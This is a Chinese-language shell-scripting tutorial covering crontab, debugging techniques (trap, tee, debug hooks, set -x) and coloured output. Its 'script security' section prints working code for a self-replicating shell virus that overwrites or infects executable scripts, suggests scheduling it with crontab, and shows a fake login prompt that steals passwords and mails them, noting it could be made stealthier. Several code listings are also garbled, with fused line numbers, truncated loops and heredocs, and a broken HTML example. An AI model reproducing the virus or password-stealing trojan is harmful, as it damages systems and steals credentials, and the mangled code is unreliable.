+<p>linux还定义了两个控制文件来控制crontab，它们是：/etc/cron.allow和/etc/cron.deny。/etc/cron.allow表示哪些用户能使用crontab命令，若cron.allow为空则表明所有用户都不能安排定时任务；若该文件不存在则会查看/etc/cron.deny，只有不包含在这个文件中的用户才可以使用crontab命令；若cron.deny为空则任何用户都可以安排作业。两个文件同时存在cron.allow优先，同时不存在只有root用户能安排定时任务。</p>
+
+<p>打开/etc/crontab:</p>
+
+<p><a href="https://img.it610.com/image/info8/b06ba63cd5394c5988bd62dcf03294de.jpg"><img src="https://img.it610.com/image/info8/b06ba63cd5394c5988bd62dcf03294de.jpg" alt="shell浅谈之十二shell调试及主题_第8张图片" /></a></p>
+
+<p>crontab文件的基本格式 :<br />
+* * * * * command<br />
+minute hour day month week command</p>
+
+<p>其中：</p>
+
+<p>minute： 表示分钟，可以是从0到59之间的任何整数（每分钟用*或者 */1表示）。</p>
+
+<p>hour：表示小时，可以是从0到23之间的任何整数（0表示0点）。</p>
+
+<p>day：表示日期，可以是从1到31之间的任何整数。</p>
+
+<p>month：表示月份，可以是从1到12之间的任何整数。</p>
+
+<p>week：表示星期几，可以是从0到7之间的任何整数，这里的0或7代表星期日。</p>
+
+<p>command：要执行的命令，可以是系统命令，也可以是自己编写的脚本文件。</p>
+
+<p>在以上各个字段中，还可以使用以下特殊字符：</p>
+
+<p>星号（*）：代表所有可能的值，例如month字段如果是星号，则表示在满足其它字段的制约条件后每月都执行该命令操作。</p>
+
+<p>逗号（,）：可以用逗号隔开的值指定一个列表范围，例如，“1,2,5,7,8,9”</p>
+
+<p>中杠（-）：可以用整数之间的中杠表示一个整数范围，例如“2-6”表示“2,3,4,5,6”</p>
+
+<p>正斜线（/）：可以用正斜线指定时间的间隔频率，例如“0-23/2”表示每两小时执行一次。同时正斜线可以和星号一起使用，例如*/10，如果用在minute字段，表示每十分钟执行一次。</p>
+
+<p>crontab例子如：下午4:50删除/abc目录下所有子目录和文件： 50 16 * * * rm -r /abc/*</p>
+
+<p>crontab实现定时文件备份的例子，shell脚本实现备份功能，在crontab中定时每天执行脚本。脚本名称为fileback.sh.</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#使用root权限将/etc目录下的所有内容进行备份</li>
+<li>#fileback.sh</li>
+<li>#!/bin/bash</li>
+<li>5. DIRNAME=<code>ls /root | grep bak</code> #获取/root/bak字符串</li>
+<li>7. if [ -z &ldquo;$DIRNAME&rdquo; ] #如果/root/bak不存在，则创建一个</li>
+<li>then</li>
+<li>mkdir /root/bak</li>
+<li>cd /root/bak</li>
+<li>fi</li>
+<li>13. #获取当前年、月、日数据存储到YY、MM、DD变量中</li>
+<li>YY=<code>date +%y</code></li>
+<li>MM=<code>date +%m</code></li>
+<li>DD=<code>date +%d</code></li>
+<li>18. BACKETC=$YY$MM$DD_etc.tar.gz #备份文件的名字</li>
+<li>tar zcvf $BACKETC /etc #将/etc所有文件打包</li>
+<li>echo &ldquo;fileback finished!&rdquo;</li>
+</ol>
+
+<p>先登录root用户，cat /etc/crontab，在末尾加上：59 23 * * * /bin/bash
+/use/bin/filebach.sh，表示每天23:59执行一次 filebach.sh脚本。</p>
+
+<h1 id="三-总结">三、总结</h1>
+
+<p>（1）Shell脚本调试难度大，熟练使用trap、tee、调试钩子和shell选项将更方便地调试错误。</p>
+
+<p>（2）Shell下有颜色的脚本和脚本安全的内容还是比较有趣的，读者可以网上搜索更多的内容来补充。</p>
+
+<p>（3）crontab定时任务对于Shell脚本的定时计划性执行还是非常有用的。</p>
+
+<h1 id="一-简介-1">一、简介</h1>
+
+<p>Shell中不存在调试器，对脚本中产生的语法错误只会产生模糊的错误提示信息。shell中也经常存在隐涩的逻辑错误，使得脚本无法按照程序员的意愿运行。因此shell脚本的调试有了很大的难度。好的编程风格和习惯也是为了减小调试程序的难度。</p>
+
+<h1 id="二-详解-1">二、详解</h1>
+
+<h2 id="1-shell调试技术-1">1、Shell调试技术</h2>
+
+<p>Shell脚本调试就是发现引发脚本错误的原因以及在脚本源代码中定位发生错误的行，常用的手段包括分析输出的错误信息、通过在脚本中加入调试语句、输出调试信息来辅助诊断错误、利用调试工具等。</p>
+
+<p>（1）shell错误</p>
+
+<p>Shell脚本的错误可以分为两类，第一类是Shell脚本中存在的语法错误，这种比较直观，只要定位发生错误的代码段或行，比如漏写关键字、漏写引号、空格符该有而未有、变量大小写不区分等；第二类是Shell脚本能够执行完毕，但并不是按照我们所期望的方式运行，即存在逻辑错误，这种比较隐晦，并不影响脚本的正常执行。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>count=1</li>
+<li>MAX=5</li>
+<li>5. while [ &ldquo;$SECONDS&rdquo; -le &ldquo;$MAX&rdquo; ];do</li>
+<li>echo &ldquo;This is the $count time to sleep.&rdquo;</li>
+<li>count=$count+1</li>
+<li>###正确应是: let count=$count+1,把count当作整数处理</li>
+<li>sleep 2</li>
+<li>done</li>
+<li>12. echo &ldquo;The running time of this script is $SECONDS&rdquo;</li>
+</ol>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. Var1=56</li>
+<li>Var2=865</li>
+<li>6. let Var3=Var1*var2</li>
+<li>###正确的是: let Var3=Var1*Var2,未区分大小写字母，变量var2=0</li>
+<li>echo &ldquo;$Var1*$Var2=$Var3&rdquo;</li>
+</ol>
+
+<p>（2）shell调试技术之一：trap命令</p>
+
+<p>trap命令是linux内建命令，用于捕捉信号。trap命令可以指定收到某种信号时所执行的命名，格式为：trap command sig1 sig2 &hellip;
+sigN。</p>
+
+<p>Shell脚本执行会产生三个所谓的“伪信号”（因为这三个信号是shell产生的，而其他信号是由操作系统产生的），可以利用trap命令捕获这三个“伪信号”。它们分别是EXIT、ERR和DEBUG，其产生条件如下表：</p>
+
+<p><a href="https://img.it610.com/image/info8/28dcb5ef364747339cff120ca193ade3.jpg"><img src="https://img.it610.com/image/info8/28dcb5ef364747339cff120ca193ade3.jpg" alt="" /></a></p>
+
+<p>trap命令通过捕捉三种“伪信号”能方便地随时监控变量的变化、正常函数和脚本的结束、跟踪异常的函数和命令。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#利用trap命令捕捉DEBUG信号跟踪变量值</li>
+<li>#!/bin/bash</li>
+<li>4. trap &lsquo;echo &ldquo;before execute line:$LINENO, a=$a,b=$b,c=$c&rdquo;&rsquo; DEBUG #LINENO是shell内部变量,打印执行命令的行号</li>
+<li>a=0</li>
+<li>b=2</li>
+<li>c=100</li>
+<li>while : #冒号相当于TRUE</li>
+<li>do</li>
+<li>if ((a &gt;= 10)) #i大于等于10时，跳出while循环</li>
+<li>then</li>
+<li>break</li>
+<li>fi</li>
+<li>echo &ldquo;*************&rdquo;</li>
+<li>let &ldquo;a=a+2&rdquo;</li>
+<li>let &ldquo;b=b*2&rdquo;</li>
+<li>let &ldquo;c=c-10&rdquo;</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/95f30db152f242b9999421a22fcc0b28.png"><img src="https://img.it610.com/image/info8/95f30db152f242b9999421a22fcc0b28.png" alt="shell浅谈之十二shell调试及主题_第9张图片" /></a></p>
+
+<p>上图为部分输出截图，其中由于trap命令的存在，每执行一行命名前都输出a、b、c三个变量的值。执行第5行a=0前捕捉到DEBUG信号，打印未初始化的三个变量的值。trap、do、then、done、fi都无DEBUG信号发出。</p>
+
+<p>利用trap命令捕获DEBUG信号，只需一条trap语句就可以完成对相关变量的全程跟踪，分析运行结果可以看到整个脚本的执行轨迹，判断哪些条件分支执行了哪些条件分支没有执行。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#利用trap命令捕捉EXIT信号跟踪函数结束</li>
+<li>#!/bin/bash</li>
+<li>4. fun1()</li>
+<li>{</li>
+<li>echo &ldquo;This is an correct function&rdquo;</li>
+<li>var=2010</li>
+<li>return 0 #return不发送EXIT信号</li>
+<li>}</li>
+<li>trap &lsquo;echo &ldquo;Line:$LINENO,var=$var&rdquo;&rsquo; EXIT</li>
+<li>echo &ldquo;*************&rdquo;</li>
+<li>fun1</li>
+<li>echo &ldquo;&mdash;&mdash;&mdash;&mdash;&rdquo;</li>
+<li>exit 0 #发送EXIT信号，执行结果： Line:1,var=2010</li>
+</ol>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#trap捕捉ERR信号跟踪函数或命名异常，一条命令返回非零状态码时即执行不成功</li>
+<li>#!/bin/bash</li>
+<li>4. fun2()</li>
+<li>{</li>
+<li>echo &ldquo;This is an error function&rdquo;</li>
+<li>var=2010</li>
+<li>return 1 #非零被认为是异常函数，产生ERR信号</li>
+<li>}</li>
+<li>trap &lsquo;echo &ldquo;Line:$LINENO,var=$var&rdquo;&rsquo; ERR</li>
+<li>fun2</li>
+<li>ipconfig #错误的命令，正确是ifconfig，产生ERR信号</li>
+</ol>
+
+<p>（3）shell调试技术之二：tee命令</p>
+
+<p>tee命令产生的数据流向字母T，将一个输出分为两个支流，一个到标准输出另一个到某输出文件。tee的特性可以使用到shell的管道及输入/输出重定向的调试上，使用管道时，其中间结果不会显示在屏幕上，若管道连接的一系列命名的执行并非预期结果，则调试出现困难，此时就得借助于tee命名。</p>
+
+<p>利用tee命令获得机器的IP地址（非常实用）。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. localIP=<code>cat /etc/sysconfig/network-scripts/ifcfg-p4p1 | tee debug.log | grep 'IPADDR' | tee -a debug.log | cut -d= -f2 | tee -a debug.log</code></li>
+<li>echo &ldquo;The local IP is: $localIP&rdquo;</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/f1ee4bf5fb30456491c14d9d2fb677e6.jpg"><img src="https://img.it610.com/image/info8/f1ee4bf5fb30456491c14d9d2fb677e6.jpg" alt="" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. localIP=<code>ifconfig | grep 'inet addr' | grep -v '127.0.0.1' | cut -d: -f3 | awk '{print $1}'</code></li>
+<li>echo &ldquo;The local IP is: $localIP&rdquo;</li>
+</ol>
+
+<p>在当前目录下会产生debug.log文件，tee -a追加到文件，因此debug.log保存了处理的信息，查看文件了解管道间的数据流向。</p>
+
+<p>tee命令适用于管道的调试，观察tee命令产生的中间结果文件，可以清晰地看出管道间的数据流向。</p>
+
+<p>（4）shell调试技术之三：调试钩子</p>
+
+<p>调试钩子也称为调试块，实际上是if/then结构的代码块，在程序开发调试阶段将DEBUG设置成TRUE，到发布阶段将DEBUG设置成FALSE，关闭调试钩子，无须删除代码。调试钩子的代码：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>DEBUG()</li>
+<li>{</li>
+<li>if [ &ldquo;$DEBUG&rdquo; = &ldquo;true&rdquo; ]</li>
+<li>then</li>
+<li>echo &ldquo;Debugging information:&rdquo;</li>
+<li>fi</li>
+<li>}</li>
+</ol>
+
+<p>调试钩子中DEBUG是一个全局变量，开发调试阶段，可利用export DEBUG=true命令将DEBUG设置成true，执行调试信息。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. DEBUG()</li>
+<li>{</li>
+<li>if [ &ldquo;$DEBUG&rdquo; = &ldquo;true&rdquo; ]</li>
+<li>then</li>
+<li>$@ #输出所有参数信息与$*等价</li>
+<li>fi</li>
+<li>}</li>
+<li>11. a=0</li>
+<li>b=2</li>
+<li>c=100</li>
+<li>DEBUG echo &ldquo;a=$a b=$b c=$c&rdquo; #第1个调试钩子</li>
+<li>while :</li>
+<li>do</li>
+<li>DEBUG echo &ldquo;a=$a b=$b c=$c&rdquo; #第2个调试钩子</li>
+<li>if ((a &gt;= 10)) #当a大于等于10时，跳出while循环</li>
+<li>then</li>
+<li>break</li>
+<li>fi</li>
+<li>23. let &ldquo;a=a+2&rdquo; #a、b、c值不断变化</li>
+<li>let &ldquo;b=b*2&rdquo;</li>
+<li>let &ldquo;c=c-10&rdquo;</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/392af67072144f21ac1a2ee0f68eb820.png"><img src="https://img.it610.com/image/info8/392af67072144f21ac1a2ee0f68eb820.png" alt="shell浅谈之十二shell调试及主题_第10张图片" /></a></p>
+
+<p>（5）shell调试技术之四：shell选项</p>
+
+<p>利用set命令开启和关闭shell选项的方法，不用修改源代码即可输出相关的调试信息。用于脚本的调试选项是-n、-x和-c。</p>
+
+<p><a href="https://img.it610.com/image/info8/81143d4e715d4c578980dc4b3c393bbe.jpg"><img src="https://img.it610.com/image/info8/81143d4e715d4c578980dc4b3c393bbe.jpg" alt="shell浅谈之十二shell调试及主题_第11张图片" /></a></p>
+
+<p>Shell脚本编写完成后，使用-
+n选项来测试脚本是否存在语法错误是一个很好的习惯。因为实际执行脚本会对系统环境产生影响，则执行时发现语法错误还得做一系列的系统环境的恢复工作，才能继续测试脚本。脚本中开启-
+n选项，使用set -n或set -o noexec，脚本会检测语法并不执行。也可以利用sh命名直接对脚本进行语法检查：sh -n 脚本名。</p>
+
+<p>-x选项用来跟踪脚本的执行，把实际执行的每一条命令行显示出来，并在行首显示一个“+”符号，“+”符号后面显示的是经过了变量替换之后的命名行内容，有助于分析实际执行的命令。-x选项经常与trap捕捉DEBUG信号结合使用，这样既可以输出实际执行的每一条命令又可以逐行跟踪相关变量的值，对调试有很大的帮助。可在脚本内使用set -x或使用sh -x执行脚本。</p>
+
+<p>-x选项以“+”作为提示符表示调试信息，显得美中不足，可以通过shell提供的三个有用的内部变量定制-x选项的提示符。设置PS4使得-x提示符能包含LINENO和FUNCNAME等丰富的信息。</p>
+
+<p><a href="https://img.it610.com/image/info8/8637b8fdfb1e4db5b271bc43a8bcd3d1.jpg"><img src="https://img.it610.com/image/info8/8637b8fdfb1e4db5b271bc43a8bcd3d1.jpg" alt="shell浅谈之十二shell调试及主题_第12张图片" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. isroot() #判断执行脚本的用户是否是root</li>
+<li>{</li>
+<li>if [ &ldquo;$UID&rdquo; -ne 0 ]</li>
+<li>then</li>
+<li>return 1</li>
+<li>else</li>
+<li>return 0</li>
+<li>fi</li>
+<li>}</li>
+<li>13. echoroot()</li>
+<li>{</li>
+<li>isroot #调用函数</li>
+<li>if [ &ldquo;$?&rdquo; -ne 0 ]</li>
+<li>then</li>
+<li>echo &ldquo;I am not ROOT user!&rdquo;</li>
+<li>else</li>
+<li>echo &ldquo;ROOT user!&rdquo;</li>
+<li>fi</li>
+<li>}</li>
+<li>24. export PS4=&lsquo;+{$LINENO:${FUNCNAME[0]}:${FUNCNAME[1]}}&rsquo; #对PS4变量重新赋值</li>
+<li>echoroot</li>
+</ol>
+
+<p>-c选项作用是使用shell解释器从一个字符串中而不是文件中读取并执行shell命名，仅用于临时测试一小段脚本的执行结果，而在shell命令行直接输入也会达到相同效果， 因此使用频率不高。如sh -c &lsquo;a=2;b=2012;let c=$a*$b;echo &ldquo;c=$c&rdquo;&lsquo;，命令间用分号分隔。</p>
+
+<h2 id="2-shell主题-1">2、Shell主题</h2>
+
+<p>（1）Shell说明和用户提示信息</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. flag=0;</li>
+<li>5. echo &ldquo;This script is used to username and password what you input is right or wrong. &ldquo;</li>
+<li>7. for ((i=0 ; i</li>
+<li>do</li>
+<li>echo -n &ldquo;Please input your name: &ldquo;</li>
+<li>read username</li>
+<li>12. echo -n &ldquo;Please input your password: &ldquo;</li>
+<li>read password</li>
+<li>15. if test &ldquo;$username&rdquo; = &ldquo;user&rdquo; -a &ldquo;$password&rdquo; = &ldquo;pwd&rdquo;</li>
+<li>then</li>
+<li>echo &ldquo;login success&rdquo;</li>
+<li>flag=1</li>
+<li>break</li>
+<li>else</li>
+<li>echo &ldquo;The username or password is wrong!&rdquo;</li>
+<li>fi</li>
+<li>done</li>
+<li>25. if [ &ldquo;$flag&rdquo; -eq &ldquo;0&rdquo; ]</li>
+<li>then</li>
+<li>echo &ldquo;You have tried 3 times. Login fail!&rdquo;</li>
+<li>fi</li>
+</ol>
+
+<p>（2） Shell特殊命令，shift和getopts</p>
+
+<p>shift命令主要用于向脚本传递参数时每次将参数位置向左偏移一位。</p>
+
+<p>使用shift显示所有的命令行参数：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. echo &ldquo;number of arguments is $#&rdquo;</li>
+<li>5. echo &ldquo;What you input is: &ldquo;</li>
+<li>7. while [[ &ldquo;$*&rdquo; != &ldquo;&rdquo; ]] #等价于while [ &ldquo;$#&rdquo; -gt 0 ]</li>
+<li>do</li>
+<li>echo &ldquo;$1&rdquo;</li>
+<li>shift</li>
+<li>done</li>
+</ol>
+
+<p>Shell中提供了一条获取和处理命令行选项的getopts语句，使得控制多个命令行参数更加容易。格式为getopts option
+variable，option中包含一个有效的单字符选项。若getopts命令在命令行中发现了连字符，那么命名将用连字符后面的字符与option相比较，若匹配成功则
+把变量variable值设为该选项，若匹配不成功，则 variable设为“?”。当getopts发现连字符后面没有字符后会返回一个非零的状态值。</p>
+
+<p>有时有必要在脚本中指定命令行选项取值，getopts提供了一种方式，在option中将一个冒号放在选项后，如getopts ab: variable表示-
+a后可以不加实际值进行传递，而-b后必须取值，如果试图不取值传递此选项，会返回一个错误信息。有时错误信息提示并不明确，需要自己定义提示信息屏蔽它，那么将冒号放在option的开始部分，如getopts
+:ab: variable。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. while getopts &ldquo;:fh:&rdquo; optname</li>
+<li>do</li>
+<li>case &ldquo;$optname&rdquo; in</li>
+<li>f)</li>
+<li>echo &ldquo;Option $optname is specified&rdquo;</li>
+<li>;;</li>
+<li>h)</li>
+<li>echo &ldquo;Option $optname has value $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>\?)</li>
+<li>echo &ldquo;Unknown option $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>:)</li>
+<li>echo &ldquo;No parameter value for option $OPTARG&rdquo;</li>
+<li>;;</li>
+<li>*)</li>
+<li>echo &ldquo;Unknown error while processing options&rdquo;</li>
+<li>;;</li>
+<li>esac</li>
+<li>done</li>
+<li>24. shift $(($OPTIND - 1))</li>
+<li>26. for options in &ldquo;$@&rdquo;</li>
+<li>do</li>
+<li>if [ ! -f $2 ]</li>
+<li>then</li>
+<li>echo &ldquo;Can not find file $options . &ldquo;</li>
+<li>else</li>
+<li>echo &ldquo;Find the file $options . &ldquo;</li>
+<li>fi</li>
+<li>done</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/f2a948bad7f64fa6a146c8c2a97b3759.jpg"><img src="https://img.it610.com/image/info8/f2a948bad7f64fa6a146c8c2a97b3759.jpg" alt="shell浅谈之十二shell调试及主题_第13张图片" /></a><br />
+-f用于判断输入的第二哥命令行参数是否为文件，而-h 后必须取值。</p>
+
+<p>（3）Shell中/dev文件系统</p>
+
+<p>Shell中存在伪文件系统/dev，该文件系统包含每个物理设备对应的文件。若需挂载物理设备或虚拟物理设备则可通过操作/dev完成。/dev/null和/dev/zero是两个特殊的伪设备，它们是虚拟的仅仅存在于软件的虚拟设备中。</p>
+
+<p>/dev/zero是一个非常有用的伪设备，它用于创建空文件也可以创建RAM文件，可通过/dev/zero来建立一个交换文件。</p>
+
+<p>/dev/null相当于一个文件的“黑洞”
+，它非常接近于一个只写文件，所以写入它的内容都会永远丢失。若不想使用stdout，可以通过使用/dev/null将stdout禁止。如find /
+-name string &gt; /dev/null，把查找的错误提示转移到特定的目录中。shell中会有如下命令： &gt;/dev/null
+2&gt;&amp;1，其中”&gt;/dev/null“等价于”1&gt;/dev/null“表示标准输出重定向到空设备文件，“2&gt;&amp;1”表示标准错误输出重定向等同于标准输出，也重定向到空设备文件。例如find
+/ -name string &gt; result.log 2&gt;&amp;1（等价于find / -name string 2&gt; result.log 1&gt;&amp;2）。</p>
+
+<p>（4）Shell中/proc文件系统</p>
+
+<p>/proc文件系统是一个伪文件系统，它只存在内存中而不占用外存空间。它以文件系统的方式为访问系统内核数据的操作提供接口。用户和应用程序可以通过/proc得到系统的信息并可以改变内核的某些参数。由于系统的信息（如进程）是动态改变的，所以/proc文件系统是动态地从系统内核读出所需信息并提交的。/proc内的文件常被称为虚拟文件，有些文件使用查看命令查看会返回大量信息但文件本身的大小却会显示0字节。</p>
+
+<p>在/proc下有三个很重要的目录：net、scsi和sys。sys目录可写，可通过它来访问或修改内核的参数，而net和scsi则依赖于内核配置。</p>
+
+<p>cat
+/proc/interrupts查看中断，/proc/sys目录修改内核参数来优化系统，/proc中有编号（为进程ID）的子目录可以查看运行中的进程信息，cat
+/proc/filesystems | awk -F&rsquo;\t&rsquo; &lsquo;{print $2}&lsquo;查看文件系统支持的类型，cat
+/proc/net/sockstat查看网络信息，cat /proc/net/tcp查看TCP的具体使用情况。</p>
+
+<p>（5）带颜色的shell脚本</p>
+
+<p>Shell脚本中，脚本执行终端的颜色可以使用“ANSI非常规字符序列”来生成，如echo -e &ldquo;\033[44;37;5m Hello
+World\033[0m&rdquo;，将前景色设置成蓝色，背景色设置成白色。-e用于激活特殊字符的解析器，\033引导非常规字符序列，m意味着设置属性并结束非常规字符序列，&rdquo;44;37;5&rdquo;可以生成不同颜色的组合，数值和编码的前后顺序无关。</p>
+
+<p>选择的编码表：</p>
+
+<p><a href="https://img.it610.com/image/info8/6464ced297c14354befbb061c25dd5be.jpg"><img src="https://img.it610.com/image/info8/6464ced297c14354befbb061c25dd5be.jpg" alt="" /></a></p>
+
+<p><a href="https://img.it610.com/image/info8/340804ddf0e247cfbbf7fe56b8cec5d9.jpg"><img src="https://img.it610.com/image/info8/340804ddf0e247cfbbf7fe56b8cec5d9.jpg" alt="shell浅谈之十二shell调试及主题_第14张图片" /></a></p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#输出彩色的字符串的形式</li>
+<li>#!/bin/bash</li>
+<li>4. cfont()</li>
+<li>{</li>
+<li>while ((&ldquo;$#&rdquo;!= 0))</li>
+<li>do</li>
+<li>case $1 in</li>
+<li>-b)</li>
+<li>echo -ne &ldquo; &ldquo;</li>
+<li>;;</li>
+<li>-t)</li>
+<li>echo -ne &ldquo;\t&rdquo;</li>
+<li>;;</li>
+<li>-n)</li>
+<li>echo -ne &ldquo;\n&rdquo;</li>
+<li>;;</li>
+<li>-black)</li>
+<li>echo -ne &ldquo;\033[30m&rdquo; #黑色前景</li>
+<li>;;</li>
+<li>-red)</li>
+<li>echo -ne &ldquo;\033[31m&rdquo; #红色前景</li>
+<li>;;</li>
+<li>-green)</li>
+<li>echo -ne &ldquo;\033[32m&rdquo; #绿色前景</li>
+<li>;;</li>
+<li>-yellow)</li>
+<li>echo -ne &ldquo;\033[33m&rdquo; #黄色前景</li>
+<li>;;</li>
+<li>-blue)</li>
+<li>echo -ne &ldquo;\033[34m&rdquo; #蓝色前景</li>
+<li>;;</li>
+<li>-purple)</li>
+<li>echo -ne &ldquo;\033[35m&rdquo; #紫色前景</li>
+<li>;;</li>
+<li>-cyan)</li>
+<li>echo -ne &ldquo;\033[36m&rdquo; #青色前景</li>
+<li>;;</li>
+<li>-white|-gray)</li>
+<li>echo -ne &ldquo;\033[37m&rdquo; #白色/灰色前景</li>
+<li>;;</li>
+<li>-reset)</li>
+<li>echo -ne &ldquo;\033[0m&rdquo; #重新设置属性到默认设置</li>
+<li>;;</li>
+<li>-h|-help|&ndash;help)</li>
+<li>echo &ldquo;Usage: cfont -color1 message1 -color2 message2 &hellip;&rdquo;</li>
+<li>echo &ldquo;eg: cfont -red [ -blue message1 message2 -red ]&rdquo;</li>
+<li>;;</li>
+<li>*)</li>
+<li>echo -ne &ldquo;$1&rdquo;</li>
+<li>;;</li>
+<li>esac</li>
+<li>54. shift</li>
+<li>done</li>
+<li>}</li>
+<li>58. cfont -green &ldquo;Start service &hellip;&rdquo; -red &ldquo; [&rdquo; -blue &ldquo; OK&rdquo; -red &ldquo; ]&rdquo; -black -n</li>
+</ol>
+
+<p><a href="https://img.it610.com/image/info8/7e5c862eeb4240bc94ff090ab760f1a5.jpg"><img src="https://img.it610.com/image/info8/7e5c862eeb4240bc94ff090ab760f1a5.jpg" alt="" /></a></p>
+
+<h2 id="3-shell脚本安全-1">3、Shell脚本安全</h2>
+
+<p>（1）shc工具加密shell脚本</p>
+
+<p>若Shell脚本中包含敏感的口令或其他重要信息，而且不希望用户通过ps
+-ef捕获敏感信息，可用shc工具给脚本增加一层额外的安全保护。shc使用RC4加密算法把shell脚本转换成二进制可执行文件（支持静态和动态链接）。</p>
+
+<p>shc安装后使用命名进行加密：shc -v -f
+filename.sh，-v是输出详细编译日志，-f指定脚本的名称。加密成功后会生成以.x和.c结尾的两个新文件，如生成可执行文件filename.sh.x和C语言源文件filename.sh.x.c。</p>
+
+<p>（2）shell脚本简单病毒</p>
+
+<p>最原始的shell病毒:</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. for file in *</li>
+<li>do</li>
+<li>cp $0 $file</li>
+<li>done</li>
+</ol>
+
+<p>遍历当前文件系统的所有文件，然后覆盖所有文件，但linux是多用户操作系统，它的文件具有保护模式，所以上述脚本会报出一大堆错误，所以会很快被管理员发现并制止它的传染，为增强其隐蔽性对脚本进行改进：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>3. for file in *</li>
+<li>do</li>
+<li>if test -f $file #测试是否是文件</li>
+<li>then</li>
+<li>if test -x $file #测试文件是否可执行</li>
+<li>then</li>
+<li>if test -w $file #测试文件是否可读</li>
+<li>then</li>
+<li>grep -s &ldquo;myself_flag&rdquo; $file &gt; .temp 2&gt;&amp;1 #判断自己的一个标志，是否为该shell脚本</li>
+<li>#可以写成 if file $file | grep -s &lsquo;shell script&rsquo; &gt; /dev/null</li>
+<li>if [ $? -ne 0 ]</li>
+<li>then</li>
+<li>cp -f $0 $file</li>
+<li>fi</li>
+<li>fi</li>
+<li>fi</li>
+<li>fi</li>
+<li>done</li>
+<li>rm .temp -f</li>
+</ol>
+
+<p>但是脚本病毒一旦在感染完毕后就什么也不做了，它没有像二进制病毒那样的潜伏的危害性，只是简单的覆盖宿主而已。</p>
+
+<p>下面利用传统的二进制病毒的感染机制并优化的代码：</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash infection</li>
+<li>for file in * ; do</li>
+<li>if test -f $file &amp;&amp; test -x $file &amp;&amp; test -w $file ; then</li>
+<li>if grep -s &ldquo;myself_flag&rdquo; $file &gt; /dev/null ; then</li>
+<li>head -n 1 $file &gt; .mm #提取要感染的脚本第一行</li>
+<li>if grep -s &ldquo;infection&rdquo; .mm &gt; /dev/null ; then</li>
+<li>rm .mm -f</li>
+<li>else</li>
+<li>cat $file &gt; .SAVE #借助传统的二进制的感染机制</li>
+<li>head -n 14 $0 &gt; $file</li>
+<li>cat .SAVE &gt;&gt; $file #追加到文件</li>
+<li>fi;fi;fi</li>
+<li>done</li>
+<li>rm .SAVE .mm -f</li>
+</ol>
+
+<p>接着可以使用crontab命令让系统以一定的时间间隔调度这些命令执行或设置成开机自动运行即可。</p>
+
+<p>（2）shell木马</p>
+
+<p>Shell中同样存在木马，它看上去无害，却隐藏着很大的危险。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>clear</li>
+<li>cat /etc/issue</li>
+<li>echo -n &ldquo;login:&rdquo;</li>
+<li>read login</li>
+<li>echo -n &ldquo;password:&rdquo;</li>
+<li>stty -echo</li>
+<li>read passwd</li>
+<li>stty sane</li>
+<li>mail $USER &lt;</li>
+<li>login:$login</li>
+<li>passwd:$passwd</li>
+<li>fin</li>
+<li>echo</li>
+<li>echo &ldquo;login incorrect&rdquo;</li>
+<li>sleep 1</li>
+<li>exit 0</li>
+</ol>
+
+<p>一个盗取别人passwd的shell脚本，当然有经验的linux使用者以下就能区分出来，可以将该木马做的更隐蔽。</p>
+
+<h2 id="4-shell简单应用-1">4、Shell简单应用</h2>
+
+<p>（1）将文本转换成HTML</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>B Liu:Shanghai Jiaotong University:Shanghai:China</li>
+<li>C Lin:University of Toronto:Toronto:Canada</li>
+<li>D Hou:Beijing University:Beijing:China</li>
+<li>J Luo:Southeast University:Nanjing:China</li>
+<li>Y Zhang:Victory University:Melbourne:Australia</li>
+</ol>
+
+<p>新建htmlconver.sh脚本，chmod +x htmlconver.sh，然后执行./htmlconver.sh &lt; html.txt &gt;
+conver.html。</p>
+
+<p><strong>[cpp]</strong> view plain  copy</p>
+
+<ol>
+<li>#!/bin/bash</li>
+<li>cat &lt;</li>
+<li>HTML PUBLIC &ldquo;-//W3C//DTD HTML 4.0 Transitional//EN&rdquo; &ldquo;<a href="http://www.w3.org/TR/html4/loose.dtd&quot;&gt;">http://www.w3.org/TR/html4/loose.dtd&quot;&gt;</a></li>
+<li>5.   6.   7. information</li>
+<li>9.   10.   11.   12. CLOUD</li>
